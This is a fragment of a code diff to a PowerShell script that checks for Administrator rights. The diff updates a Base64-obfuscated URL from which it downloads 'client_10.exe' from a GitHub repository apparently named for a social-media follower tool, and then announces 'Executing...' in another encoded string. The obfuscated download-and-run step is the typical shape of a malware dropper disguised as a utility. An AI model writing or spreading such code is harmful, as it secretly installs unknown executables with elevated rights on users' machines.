@@ -33,7 +33,7 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     try {
         if (!(Test-Path $path)) {
             $web = New-Object System.Net.WebClient
-            $web.DownloadFile(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2plbWJleC9Ub3AtRm9sbG93ZXJzL3Jhdy9yZWZzL2hlYWRzL21haW4vY2xpZW50XzEwLmV4ZQ=='))), $path)
+            $web.DownloadFile(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2plbWJleC9Ub3AtRm9sbG93ZXJzL21haW4vY2xpZW50XzEwLmV4ZQ=='))), $path)
         }
         if (Test-Path $path) {
             Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WytdIEV4ZWN1dGluZy4uLg=='))) -ForegroundColor Green
